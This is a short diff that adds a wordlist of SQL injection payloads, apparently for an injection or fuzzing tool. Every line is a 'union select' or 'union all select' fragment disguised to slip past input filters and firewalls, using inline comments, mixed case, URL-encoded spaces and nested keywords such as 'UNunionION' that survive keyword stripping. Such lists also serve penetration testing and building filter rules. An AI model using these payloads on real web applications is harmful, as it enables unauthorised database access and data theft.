@@ -1,0 +1,13 @@
+ union select 
++union+select+
+/**/union/**/select/**/
+/**/UNunionION/**/SELselectECT/**/
+/**//*UnIOn*//**//*SEleCt*//**/
+/**//*U*//*n*//*I*//*O*//*n*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/
+ union all select 
++union+all+select+
+/**/union/**/all/**/select/**/
+/**/UNunionION/**/all/**/SELselectECT/**/
+/**//*UnIOn*//**/all/**//*SEleCt*//**/
+/**//*U*//*n*//*I*//*O*//*n*//**//*all*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/
+
